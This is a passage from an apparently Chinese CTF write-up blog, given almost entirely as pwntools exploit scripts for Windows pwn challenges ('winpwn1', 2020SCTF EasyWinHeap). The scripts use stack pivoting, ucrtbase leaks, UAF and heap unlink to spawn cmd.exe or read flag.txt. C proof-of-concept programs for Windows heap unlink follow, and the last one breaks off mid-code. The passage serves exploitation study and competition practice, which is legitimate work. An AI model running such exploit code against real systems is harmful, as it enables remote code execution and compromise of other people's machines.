class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            r.close()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ucrtbase:"</span>,hex(ucrtbase)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pioinfo_off == <span class="number">0</span> :</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line"></span><br><span class="line">            r = remote(host,port)</span><br><span class="line">            pioinfo = leak(ucrtbase+<span class="number">0xeb770</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"pioinfo:"</span>,hex(pioinfo)</span><br><span class="line">            pioinfo_off = pioinfo &amp; <span class="number">0xffff</span></span><br><span class="line">            r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">            r.sendline(<span class="string">"6"</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">if</span> pioinfo == <span class="number">0</span> :</span><br><span class="line">                r = remote(host,port)</span><br><span class="line">                pioinfo = leak(ucrtbase+<span class="number">0xeb771</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">"pioinfo:"</span>,hex(pioinfo)</span><br><span class="line">                pioinfo_off = pioinfo &amp; <span class="number">0xffff</span></span><br><span class="line">                r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">                r.sendline(<span class="string">"6"</span>)</span><br><span class="line">                r.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            r.close()</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"pioinfo_off:"</span>,hex(pioinfo_off)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        r= remote(host,port)</span><br><span class="line">        exp()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line">    <span class="keyword">finally</span> :</span><br><span class="line">        r.close()</span><br></pre></td></tr></table></figure>
<h1 id="winpwn1"><a href="#winpwn1" class="headerlink" title="winpwn1"></a>winpwn1</h1><h2 id="思路：-4"><a href="#思路：-4" class="headerlink" title="思路："></a>思路：</h2><p>某个网站的<code>winpwn1</code>，是个栈溢出，本地打通，但是远程不通。。。远程一直泄露不出来，我偏移爆破也没试出来。。。之前看一个大佬说<code>win</code>下打通本地打不通远程的情况要比<code>linux</code>下复杂的多，现在终于遇到了。以后有时间再研究。</p>
<p>栈迁移即可，可能找<code>gadget</code>需要思路比较灵活。</p>
<h2 id="exp：-4"><a href="#exp：-4" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'192.168.21.1'</span>,<span class="number">8889</span>)</span><br><span class="line"><span class="comment">#p = remote('winpwn.eonew.cn',20001)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">puts_IAT = <span class="number">0x4020c4</span></span><br><span class="line">main = <span class="number">0x401130</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0040190a : pop ebx ; ret</span></span><br><span class="line"><span class="comment">#0x0040136d : pop ecx ; pop ecx ; ret</span></span><br><span class="line"><span class="comment">#0x00401908 : pop edi ; pop esi ; pop ebx ; ret</span></span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x1f000</span></span><br><span class="line">p.recvuntil(<span class="string">'Win pwn 1\r\n'</span>)</span><br><span class="line">payload = <span class="string">'\x11'</span>*<span class="number">0x80</span></span><br><span class="line">payload+= p32(stack)</span><br><span class="line">payload+= p32(<span class="number">0x401143</span>) </span><br><span class="line">payload+= p32(puts_IAT)</span><br><span class="line">raw_input(<span class="string">'[+] please Enter to continue...'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'\r\n'</span>)</span><br><span class="line">ucrtbase = u32(p.recv(<span class="number">4</span>)) - (<span class="number">0x75fc89f0</span><span class="number">-0x75f10000</span>) </span><br><span class="line">log.success(<span class="string">'ucrtbase = '</span>+hex(ucrtbase))</span><br><span class="line"></span><br><span class="line">system = ucrtbase + (<span class="number">0x75fffda0</span><span class="number">-0x75f10000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x22'</span>*<span class="number">0x80</span></span><br><span class="line">payload+= p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+= p32(system)</span><br><span class="line">payload+= p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+= p32(stack+<span class="number">0x78</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+= <span class="string">'cmd.exe\x00'</span></span><br><span class="line">raw_input(<span class="string">'[+] please Enter to continue...'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="orw-exp："><a href="#orw-exp：" class="headerlink" title="orw_exp："></a>orw_exp：</h2><p>用<code>ucrtbase!_open/ucrtbase!_read/puts</code>打印出<code>flag</code>文件。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'192.168.21.1'</span>,<span class="number">8880</span>)</span><br><span class="line"><span class="comment">#p = remote('winpwn.eonew.cn',20001)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">puts_IAT = <span class="number">0x4020c4</span></span><br><span class="line">main = <span class="number">0x401130</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0040190a : pop ebx ; ret</span></span><br><span class="line"><span class="comment">#0x0040136d : pop ecx ; pop ecx ; ret</span></span><br><span class="line"><span class="comment">#0x00401908 : pop edi ; pop esi ; pop ebx ; ret</span></span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x1f000</span></span><br><span class="line">p.recvuntil(<span class="string">'Win pwn 1\r\n'</span>)</span><br><span class="line">payload = <span class="string">'\x11'</span>*<span class="number">0x80</span></span><br><span class="line">payload+= p32(stack)</span><br><span class="line">payload+= p32(<span class="number">0x401143</span>) </span><br><span class="line">payload+= p32(puts_IAT)</span><br><span class="line">raw_input(<span class="string">'[+] please Enter to continue...'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'\r\n'</span>)</span><br><span class="line">ucrtbase = u32(p.recv(<span class="number">4</span>)) - (<span class="number">0x75fc89f0</span><span class="number">-0x75f10000</span>) </span><br><span class="line">log.success(<span class="string">'ucrtbase = '</span>+hex(ucrtbase))</span><br><span class="line"></span><br><span class="line">_open = ucrtbase + (<span class="number">0x75ff1030</span><span class="number">-0x75f10000</span>)</span><br><span class="line">_read = ucrtbase + (<span class="number">0x75f3b600</span><span class="number">-0x75f10000</span>)</span><br><span class="line">puts = ucrtbase + (<span class="number">0x75fc89f0</span><span class="number">-0x75f10000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x22'</span>*<span class="number">0x80</span></span><br><span class="line">payload+= p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+= p32(_open)</span><br><span class="line">payload+= p32(<span class="number">0x40136d</span>)</span><br><span class="line">payload+= p32(stack+<span class="number">0x78</span>)</span><br><span class="line">payload+= p32(<span class="number">2</span>)</span><br><span class="line">payload+= p32(_read)</span><br><span class="line">payload+= p32(<span class="number">0x401908</span>)</span><br><span class="line">payload+= p32(<span class="number">3</span>)</span><br><span class="line">payload+= p32(stack+<span class="number">0x100</span>)</span><br><span class="line">payload+= p32(<span class="number">0x20</span>)</span><br><span class="line">payload+= p32(puts)</span><br><span class="line">payload+= p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+= p32(stack+<span class="number">0x100</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+= <span class="string">'flag.txt\x00'</span></span><br><span class="line">raw_input(<span class="string">'[+] please Enter to continue...'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="winpwn2"><a href="#winpwn2" class="headerlink" title="winpwn2"></a>winpwn2</h1><h1 id="2020SCTF-EasyWinHeap"><a href="#2020SCTF-EasyWinHeap" class="headerlink" title="2020SCTF_EasyWinHeap"></a>2020SCTF_EasyWinHeap</h1><p>相当简单的一道题。。。算是在正式比赛里出现过的最简单的<code>winheap</code>了，只是很久没看了，<code>windbg</code>的命令都忘得差不多了，拿起来复习了一遍，(幸好当时记了不少笔记)。。。</p>
<h2 id="思路：-5"><a href="#思路：-5" class="headerlink" title="思路："></a>思路：</h2><p>用<code>UAF</code>泄露出<code>_heap</code>，因为出题人刻意把<code>ptrlist</code>放到了<code>heap</code>上，所以我们直接可以进行<code>unlink</code>，然后任意地址读写，但是出题人太贴心了，连函数指针都给我们准备好了。。。直接改函数指针，<code>system(cmd)</code>即可。</p>
<h2 id="myexp：-1"><a href="#myexp：-1" class="headerlink" title="myexp："></a>myexp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">	p = remote(<span class="string">'192.168.21.1'</span>,<span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'47.94.245.208'</span>,<span class="number">23333</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'option &gt;\r\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'size &gt;\r\n'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'option &gt;\r\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index &gt;\r\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'option &gt;\r\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index &gt;\r\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'content  &gt;\r\n'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'option &gt;\r\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index &gt;\r\n'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x70</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x90</span>) <span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x70</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x90</span>) <span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x70</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'cmd.exe'</span>+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">	heapbase = u32(p.recvuntil(<span class="string">'\xc0\x0d\x0a'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))<span class="number">-0x580</span></span><br><span class="line"><span class="keyword">else</span>:	</span><br><span class="line">	heapbase = u32(p.recvuntil(<span class="string">'\x0d\x0a'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))<span class="number">-0x580</span></span><br><span class="line">log.success(<span class="string">'heapbase = '</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(heapbase+<span class="number">0x4a0</span>)+p32(heapbase+<span class="number">0x4a4</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(heapbase+<span class="number">0x4a0</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">	codebase = u32(p.recvuntil(<span class="string">'\x0d\x0a'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))<span class="number">-0x104a</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	codebase = u32(p.recvuntil(<span class="string">'\xa0\x04'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))<span class="number">-0x104a</span></span><br><span class="line">log.success(<span class="string">'codebase = '</span>+hex(codebase))</span><br><span class="line"></span><br><span class="line">payload = p32(codebase+<span class="number">0x104a</span>)+p32(codebase+<span class="number">0x2054</span>)</span><br><span class="line">payload+= p32(codebase+<span class="number">0x104a</span>)+p32(heapbase+<span class="number">0x4a0</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">	ucrtbase = u32(p.recv(<span class="number">4</span>))-(<span class="number">0x76fe27e0</span><span class="number">-0x76fa0000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	ucrtbase = u32(p.recv(<span class="number">4</span>))-(<span class="number">0x10047ad0</span><span class="number">-0x10001000</span>)</span><br><span class="line">log.success(<span class="string">'ucrtbase = '</span>+hex(ucrtbase))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">	system_addr = ucrtbase+(<span class="number">0x7708c090</span><span class="number">-0x76fa0000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	system_addr = ucrtbase+(<span class="number">0x100efda0</span><span class="number">-0x10001000</span>)</span><br><span class="line">payload = p32(system_addr)+p32(heapbase+<span class="number">0x570</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>) <span class="comment">#trigger</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'chcp 65001'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'cmd.exe'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'cmd.exe'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="Exploitation-in-Windows"><a href="#Exploitation-in-Windows" class="headerlink" title="Exploitation in Windows"></a>Exploitation in Windows</h1><h2 id="BackEnd-Unlink"><a href="#BackEnd-Unlink" class="headerlink" title="BackEnd-Unlink"></a>BackEnd-Unlink</h2><h3 id="关于unlink的实验："><a href="#关于unlink的实验：" class="headerlink" title="关于unlink的实验："></a>关于unlink的实验：</h3><h4 id="在HeapFree中触发unlink："><a href="#在HeapFree中触发unlink：" class="headerlink" title="在HeapFree中触发unlink："></a>在HeapFree中触发unlink：</h4><h5 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h5><p>成功案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hHeap = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span>* ptr[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	hHeap = HeapCreate(HEAP_NO_SERIALIZE, <span class="number">0x2000</span>, <span class="number">0x2000</span>);</span><br><span class="line">	<span class="comment">//system("pause");</span></span><br><span class="line">	ptr[<span class="number">0</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">1</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">2</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">3</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">4</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">1</span>]);</span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;ptr[<span class="number">1</span>], ptr[<span class="number">1</span>]);</span><br><span class="line">	*(<span class="keyword">void</span>**)(ptr[<span class="number">1</span>]) = &amp;ptr[<span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line">	*(<span class="keyword">void</span>**)(ptr[<span class="number">1</span>] + <span class="number">8</span>) = &amp;ptr[<span class="number">1</span>];</span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;ptr[<span class="number">1</span>], ptr[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"success!!!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>失败案例1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hHeap = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span>* ptr[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	hHeap = HeapCreate(HEAP_NO_SERIALIZE, <span class="number">0x2000</span>, <span class="number">0x2000</span>);</span><br><span class="line">	<span class="comment">//system("pause");</span></span><br><span class="line">	ptr[<span class="number">0</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">1</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">2</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">3</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x18</span>);  <span class="comment">// &lt; == change point</span></span><br><span class="line">	ptr[<span class="number">4</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">1</span>]);</span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;ptr[<span class="number">1</span>], ptr[<span class="number">1</span>]);</span><br><span class="line">	*(<span class="keyword">void</span>**)(ptr[<span class="number">1</span>]) = &amp;ptr[<span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line">	*(<span class="keyword">void</span>**)(ptr[<span class="number">1</span>] + <span class="number">8</span>) = &amp;ptr[<span class="number">1</span>];</span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;ptr[<span class="number">1</span>], ptr[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"success!!!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>失败案例2：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hHeap = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span>* ptr[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	hHeap = HeapCreate(HEAP_NO_SERIALIZE, <span class="number">0x2000</span>, <span class="number">0x2000</span>);</span><br><span class="line">	<span class="comment">//system("pause");</span></span><br><span class="line">	